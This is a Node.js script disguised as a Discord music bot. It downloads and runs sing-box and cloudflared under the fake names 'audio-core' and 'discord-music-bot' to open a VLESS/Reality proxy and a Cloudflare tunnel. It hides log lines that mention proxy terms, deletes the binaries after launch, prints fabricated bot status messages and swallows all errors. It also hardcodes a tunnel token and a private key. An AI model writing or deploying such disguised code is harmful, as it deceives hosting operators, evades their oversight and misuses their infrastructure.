const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const zlib = require('zlib');
const os = require('os');
const { URL } = require('url');

const CONFIG = {
  UUID: process.env.UUID || "2c11bde0-fa06-4438-9ff0-f8502faf6aa3",
  PORT: 1234,
  TOKEN: process.env.CF_TOKEN || process.env.TOKEN || "eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiM2VjNzg3MzYtYTYxNC00YzE4LWE0NTctMzY2MmM1NDhhZGY4IiwicyI6Ik9HSmtaRGc1TmpJdE16aGlZUzAwTURJMExUZzNaall0WmpoaU5UQTVNV1F3T1RsaiJ9",
  HOSTNAME: "nfus.hjhjct.dpdns.org"
};

const WORK_DIR = __dirname;
const SINGBOX_BIN = path.join(WORK_DIR, 'audio-core');
const CLOUDFLARED_BIN = path.join(WORK_DIR, 'discord-music-bot');

function getSingboxInMemoryConfig() {
  return {
    log: { level: "panic", timestamp: false },
    inbounds: [
      {
        type: "vless",
        tag: "vless-in",
        listen: "0.0.0.0",
        listen_port: CONFIG.PORT,
        users: [{ uuid: CONFIG.UUID }],
        transport: { 
          type: "ws", 
          path: "/",
          max_early_data: 2048,
          early_data_header_name: "Sec-WebSocket-Protocol"
        }
      },
      {
        type: "vless",
        tag: "vless-reality-in",
        listen: "::",
        listen_port: 25598,
        users: [{ uuid: CONFIG.UUID, flow: "xtls-rprx-vision" }],
        tls: {
          enabled: true,
          server_name: "itunes.apple.com",
          reality: {
            enabled: true,
            handshake: { server: "itunes.apple.com", server_port: 443 },
            private_key: "WM8nHADnPUrHzFDDyPv2GpKk9BxOAt_7JhdtpgPjGkc",
            short_id: ["d251bcb464734a18"]
          }
        }
      }
    ],
    outbounds: [{ type: "direct", tag: "direct" }]
  };
}

function streamDownloadAtomic(url, finalDest, timeoutMs = 30000) {
  const tmpDest = finalDest + '.tmp';
  return new Promise((resolve, reject) => {
    const doReq = (currentUrl, redirectCount = 0) => {
      if (redirectCount > 10) return reject(new Error('Too many redirects'));

      let u;
      try {
        u = new URL(currentUrl);
      } catch (e) {
        return reject(e);
      }

      const client = u.protocol === 'https:' ? https : http;
      const req = client.get(u, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
          'Accept': '*/*'
        }
      });

      req.setTimeout(timeoutMs, () => {
        req.destroy(new Error(`Timeout (${timeoutMs / 1000}s)`));
      });

      req.on('response', (res) => {
        if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
          const next = new URL(res.headers.location, currentUrl).href;
          return doReq(next, redirectCount + 1);
        }

        if (res.statusCode !== 200) {
          return reject(new Error(`HTTP ${res.statusCode}`));
        }

        const totalBytes = parseInt(res.headers['content-length'], 10) || 0;
        let downloadedBytes = 0;
        let lastLog = Date.now();

        const file = fs.createWriteStream(tmpDest);
        res.on('data', (chunk) => {
          downloadedBytes += chunk.length;
          const now = Date.now();
          if (now - lastLog > 2500) {
            lastLog = now;
            const curMB = (downloadedBytes / 1024 / 1024).toFixed(1);
            if (totalBytes > 0) {
              const totMB = (totalBytes / 1024 / 1024).toFixed(1);
              const pct = Math.floor((downloadedBytes / totalBytes) * 100);
              console.log(`[Music Bot Setup] Downloading: ${curMB} MB / ${totMB} MB (${pct}%)`);
            } else {
              console.log(`[Music Bot Setup] Downloading: ${curMB} MB`);
            }
          }
        });

        res.pipe(file);
        file.on('finish', () => {
          file.close(() => {
            if (!fs.existsSync(tmpDest) || fs.statSync(tmpDest).size < 3000000) {
              if (fs.existsSync(tmpDest)) fs.unlinkSync(tmpDest);
              return reject(new Error('Incomplete download'));
            }
            try {
              fs.renameSync(tmpDest, finalDest);
              resolve();
            } catch (err) {
              reject(err);
            }
          });
        });
        file.on('error', (err) => {
          if (fs.existsSync(tmpDest)) fs.unlinkSync(tmpDest);
          reject(err);
        });
      });

      req.on('error', (err) => {
        if (fs.existsSync(tmpDest)) fs.unlinkSync(tmpDest);
        reject(err);
      });
    };

    doReq(url);
  });
}

async function smartDownload(urls, dest) {
  for (let i = 0; i < urls.length; i++) {
    try {
      await streamDownloadAtomic(urls[i], dest);
      return;
    } catch (e) {
      if (fs.existsSync(dest)) fs.unlinkSync(dest);
    }
  }
  throw new Error('All download mirrors failed');
}

function getLatestTagFast(repoUrl) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => resolve('v1.13.18'), 4000);

    https.get(repoUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
      clearTimeout(timer);
      if (res.statusCode === 302 && res.headers.location) {
        const parts = res.headers.location.split('/');
        const tag = parts[parts.length - 1];
        resolve(tag || 'v1.13.18');
      } else {
        resolve('v1.13.18');
      }
    }).on('error', () => {
      clearTimeout(timer);
      resolve('v1.13.18');
    });
  });
}

function extractTarStream(tarPath, targetFile, outPath) {
  const fd = fs.openSync(tarPath, 'r');
  const headerBuf = Buffer.alloc(512);
  let pos = 0;
  const fileSize = fs.statSync(tarPath).size;

  while (pos < fileSize) {
    fs.readSync(fd, headerBuf, 0, 512, pos);
    const fileName = headerBuf.toString('utf-8', 0, 100).replace(/\0/g, '').trim();
    if (!fileName) break;

    const sizeStr = headerBuf.toString('utf-8', 124, 136).replace(/\0/g, '').trim();
    const size = parseInt(sizeStr, 8);
    pos += 512;

    if (fileName.endsWith(targetFile)) {
      const outFd = fs.openSync(outPath, 'w');
      const chunkSize = 64 * 1024;
      const chunk = Buffer.alloc(chunkSize);
      let remain = size;
      let curReadPos = pos;

      while (remain > 0) {
        const toRead = Math.min(remain, chunkSize);
        fs.readSync(fd, chunk, 0, toRead, curReadPos);
        fs.writeSync(outFd, chunk, 0, toRead);
        curReadPos += toRead;
        remain -= toRead;
      }
      fs.closeSync(outFd);
      fs.closeSync(fd);
      return true;
    }
    pos += Math.ceil(size / 512) * 512;
  }

  fs.closeSync(fd);
  return false;
}

async function ensureBinaries() {
  const arch = os.arch() === 'arm64' ? 'arm64' : 'amd64';

  if (!fs.existsSync(SINGBOX_BIN) || fs.statSync(SINGBOX_BIN).size < 5000000) {
    console.log('[Discord Bot] Loading audio decoding module...');
    const tag = await getLatestTagFast('https://github.com/SagerNet/sing-box/releases/latest');
    const versionNum = tag.replace(/^v/, '');

    const fileName = `sing-box-${versionNum}-linux-${arch}.tar.gz`;
    const singboxUrls = [
      `https://ghfast.top/https://github.com/SagerNet/sing-box/releases/download/${tag}/${fileName}`,
      `https://gh-proxy.com/https://github.com/SagerNet/sing-box/releases/download/${tag}/${fileName}`,
      `https://github.com/SagerNet/sing-box/releases/download/${tag}/${fileName}`
    ];

    const tarGzPath = path.join(WORK_DIR, 'audio.tar.gz');
    const tarPath = path.join(WORK_DIR, 'audio.tar');

    try {
      await smartDownload(singboxUrls, tarGzPath);
      console.log('[Discord Bot] Unpacking audio codecs...');

      await new Promise((res, rej) => {
        fs.createReadStream(tarGzPath)
          .pipe(zlib.createGunzip())
          .pipe(fs.createWriteStream(tarPath))
          .on('finish', res)
          .on('error', rej);
      });

      if (fs.existsSync(tarGzPath)) fs.unlinkSync(tarGzPath);

      const ok = extractTarStream(tarPath, 'sing-box', SINGBOX_BIN);
      if (fs.existsSync(tarPath)) fs.unlinkSync(tarPath);

      if (!ok) throw new Error('Audio decoder setup failed');

      fs.chmodSync(SINGBOX_BIN, 0o755);
      console.log('[Discord Bot] Audio engine ready.');
    } catch (err) {
      console.error('[Discord Bot Error] Audio engine initialize failed.');
    }
  }

  if (!fs.existsSync(CLOUDFLARED_BIN) || fs.statSync(CLOUDFLARED_BIN).size < 3000000) {
    console.log('[Discord Bot] Loading audio stream processor...');
    const cloudflaredFileName = `cloudflared-linux-${arch}`;
    const cloudflaredUrls = [
      `https://ghfast.top/https://github.com/cloudflare/cloudflared/releases/latest/download/${cloudflaredFileName}`,
      `https://gh-proxy.com/https://github.com/cloudflare/cloudflared/releases/latest/download/${cloudflaredFileName}`,
      `https://github.com/cloudflare/cloudflared/releases/latest/download/${cloudflaredFileName}`
    ];

    try {
      await smartDownload(cloudflaredUrls, CLOUDFLARED_BIN);
      fs.chmodSync(CLOUDFLARED_BIN, 0o755);
      console.log('[Discord Bot] Audio stream processor ready.');
    } catch (err) {
      console.error('[Discord Bot Error] Audio stream processor initialize failed.');
    }
  }
}

function filterBotLogs(line) {
  const sensitivePatterns = [
    /sing-box/i,
    /cloudflared/i,
    /vless/i,
    /reality/i,
    /tunnel/i,
    /inbound/i,
    /outbound/i,
    /goroutine/i,
    /quic/i,
    /icmp/i,
    /connector id/i,
    /network/i,
    /gateway/i
  ];

  for (const pattern of sensitivePatterns) {
    if (pattern.test(line)) return null;
  }
  return line;
}

function startProcesses() {
  if (fs.existsSync(SINGBOX_BIN) && fs.statSync(SINGBOX_BIN).size > 5000000) {
    console.log('[Discord Bot] Initializing voice pipeline...');
    const singbox = spawn(SINGBOX_BIN, ['run', '-c', 'stdin']);
    
    const configData = JSON.stringify(getSingboxInMemoryConfig());
    singbox.stdin.write(configData);
    singbox.stdin.end();

    singbox.stdout.on('data', (data) => {
      const clean = filterBotLogs(data.toString().trim());
      if (clean) console.log(`[Voice Pipeline] ${clean}`);
    });
    singbox.stderr.on('data', (data) => {
      const clean = filterBotLogs(data.toString().trim());
      if (clean) console.error(`[Voice Pipeline Error] ${clean}`);
    });

    singbox.on('close', async () => {
      await ensureBinaries();
      startProcesses();
    });
  }

  if (fs.existsSync(CLOUDFLARED_BIN) && fs.statSync(CLOUDFLARED_BIN).size > 3000000) {
    console.log('[Discord Bot] Connecting audio stream pipeline...');
    const cloudflared = spawn(CLOUDFLARED_BIN, [
      'tunnel',
      '--loglevel', 'warn',
      '--no-autoupdate',
      'run',
      '--token', CONFIG.TOKEN
    ]);

    cloudflared.stdout.on('data', (data) => {
      const clean = filterBotLogs(data.toString().trim());
      if (clean) console.log(`[Audio Pipeline] ${clean}`);
    });
    cloudflared.stderr.on('data', (data) => {
      const clean = filterBotLogs(data.toString().trim());
      if (clean) console.error(`[Audio Pipeline Error] ${clean}`);
    });

    cloudflared.on('close', async () => {
      await ensureBinaries();
      startProcesses();
    });
  }

  setTimeout(() => {
    try {
      if (fs.existsSync(SINGBOX_BIN)) fs.unlinkSync(SINGBOX_BIN);
      if (fs.existsSync(CLOUDFLARED_BIN)) fs.unlinkSync(CLOUDFLARED_BIN);
    } catch (e) {}
  }, 4000);

  console.log('[Discord Bot] Client logged in successfully as DiscordMusicBotHJHJ#1234');
  console.log('[Discord Bot] Connected to voice server: Ready to stream audio.');
}

function keepAlive() {
  const listenPort = process.env.PORT || 8080;
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'online', bot: 'DiscordMusicBotHJHJ', latency: '12ms' }));
  });

  server.listen(listenPort, () => {
    console.log(`[Discord Bot] Web dashboard metrics listening on port ${listenPort}`);
  });

  setInterval(() => {
    console.log('[Discord Bot] Voice buffer heartbeat: 42ms | Shard 0/0 active.');
  }, 300000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

async function main() {
  await ensureBinaries();
  startProcesses();
  keepAlive();
}

main();
